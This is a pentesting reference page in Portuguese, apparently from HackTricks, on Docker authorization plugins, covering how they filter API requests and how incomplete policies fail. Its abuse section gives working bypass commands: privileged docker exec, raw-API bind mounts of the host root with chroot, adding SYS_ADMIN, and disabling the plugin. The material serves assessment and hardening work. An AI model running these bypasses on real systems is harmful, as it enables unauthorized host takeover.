# Plugins de Autorização em Tempo de Execução

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral

Plugins de autorização em tempo de execução são uma camada extra de política que decide se um chamador pode realizar uma dada ação do daemon. Docker é o exemplo clássico. Por padrão, qualquer pessoa que consiga falar com o Docker daemon efetivamente tem amplo controle sobre ele. Plugins de autorização tentam estreitar esse modelo examinando o usuário autenticado e a operação de API requisitada, então permitindo ou negando a solicitação de acordo com a política.

Este tópico merece sua própria página porque altera o modelo de exploração quando um atacante já tem acesso à API do Docker ou a um usuário no grupo `docker`. Em tais ambientes, a questão não é mais apenas "posso alcançar o daemon?" mas também "o daemon está protegido por uma camada de autorização e, em caso afirmativo, essa camada pode ser contornada através de endpoints não tratados, parsing fraco de JSON, ou permissões de gerenciamento de plugins?"

## Operação

Quando uma requisição alcança o Docker daemon, o subsistema de autorização pode passar o contexto da requisição para um ou mais plugins instalados. O plugin vê a identidade do usuário autenticado, os detalhes da requisição, cabeçalhos selecionados e partes do corpo da requisição ou da resposta quando o tipo de conteúdo é adequado. Múltiplos plugins podem ser encadeados, e o acesso é concedido apenas se todos os plugins permitirem a requisição.

Esse modelo parece robusto, mas sua segurança depende inteiramente de quão completamente o autor da política entendeu a API. Um plugin que bloqueia `docker run --privileged` mas ignora `docker exec`, deixa passar chaves JSON alternativas como `Binds` no topo do JSON, ou permite administração de plugins pode criar uma falsa sensação de restrição enquanto ainda deixa caminhos diretos de elevação de privilégios abertos.

## Alvos Comuns de Plugins

Áreas importantes para revisão de políticas são:

- endpoints de criação de container
- campos de `HostConfig` tais como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, e opções de compartilhamento de namespaces
- comportamento de `docker exec`
- endpoints de gerenciamento de plugins
- qualquer endpoint que possa indiretamente acionar ações em tempo de execução fora do modelo de política pretendido

Historicamente, exemplos como o plugin `authz` da Twistlock e plugins educacionais simples como `authobot` tornaram esse modelo fácil de estudar porque seus arquivos de política e caminhos de código mostravam como o mapeamento endpoint-para-ação era realmente implementado. Para trabalhos de assessment, a lição importante é que o autor da política deve entender toda a superfície da API em vez de apenas os comandos CLI mais visíveis.

## Abuso

O primeiro objetivo é descobrir o que está realmente bloqueado. Se o daemon negar uma ação, o erro muitas vezes leaks o nome do plugin, o que ajuda a identificar o controle em uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se você precisa de um mapeamento de endpoints mais amplo, ferramentas como `docker_auth_profiler` são úteis porque automatizam a tarefa repetitiva de verificar quais rotas da API e estruturas JSON são realmente permitidas pelo plugin.

Se o ambiente usa um plugin personalizado e você pode interagir com a API, enumere quais campos dos objetos são realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Essas verificações importam porque muitas falhas de autorização são específicas ao campo em vez de ao conceito. Um plugin pode rejeitar um padrão de CLI sem bloquear completamente a estrutura equivalente da API.

### Full Example: `docker exec` Adds Privilege After Container Creation

Uma política que bloqueia a criação de containers privilegiados mas permite a criação de containers não confinados mais `docker exec` ainda pode ser contornada:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se o daemon aceitar o segundo passo, o usuário recuperou um processo interativo privilegiado dentro de um container que o autor da política acreditava estar restrito.

### Exemplo completo: Bind Mount Through Raw API

Algumas políticas defeituosas inspecionam apenas um formato JSON. Se o bind mount do sistema de arquivos raiz não for bloqueado de forma consistente, o host ainda pode ser montado:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
A mesma ideia também pode aparecer em `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
O impacto é um escape completo do sistema de arquivos do host. O detalhe interessante é que o bypass vem da cobertura incompleta da policy, em vez de um bug no kernel.

### Exemplo Completo: Atributo de capability não verificado

Se a policy esquecer de filtrar um atributo relacionado a capability, o atacante pode criar um container que recupera uma capability perigosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Uma vez que `CAP_SYS_ADMIN` ou uma capability igualmente poderosa esteja presente, muitas técnicas de breakout descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) tornam-se acessíveis.

### Exemplo Completo: Desativando o Plugin

Se operações de plugin-management forem permitidas, o bypass mais limpo pode ser desativar o controle completamente:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Esta é uma falha de política no nível do plano de controle. A camada de autorização existe, mas o usuário que deveria ser restringido ainda mantém permissão para desativá-la.

## Checks

Estes comandos visam identificar se existe uma camada de políticas e se ela parece ser completa ou superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
O que é interessante aqui:

- Mensagens de negação que incluem o nome de um plugin confirmam uma camada de autorização e frequentemente revelam a implementação exata.
- Uma lista de plugins visível ao atacante pode ser suficiente para descobrir se operações de desativação ou reconfiguração são possíveis.
- Uma política que bloqueia apenas ações óbvias via CLI mas não requisições diretas à API deve ser tratada como contornável até prova em contrário.

## Padrões do runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Não ativado por padrão | O acesso ao daemon é efetivamente tudo ou nada, a menos que um plugin de autorização esteja configurado | política de plugin incompleta, listas de bloqueio em vez de listas de permissão, permitir gerenciamento de plugins, pontos cegos em nível de campo |
| Podman | Não há um equivalente direto comum | O Podman normalmente depende mais de permissões Unix, execução rootless e decisões de exposição da API do que de plugins de authz ao estilo Docker | expor amplamente uma API do Podman com root, permissões fracas do socket |
| containerd / CRI-O | Modelo de controle diferente | Esses runtimes geralmente dependem de permissões do socket, limites de confiança do nó e controles do orquestrador em camadas superiores, em vez de plugins de authz do Docker | montar o socket em workloads, pressupostos fracos de confiança local ao nó |
| Kubernetes | Usa authn/authz nas camadas API-server e kubelet, não plugins de authz do Docker | Cluster RBAC e controles de admissão são a principal camada de políticas | RBAC excessivamente amplo, política de admissão fraca, expor diretamente APIs do kubelet ou do runtime |
{{#include ../../../banners/hacktricks-training.md}}
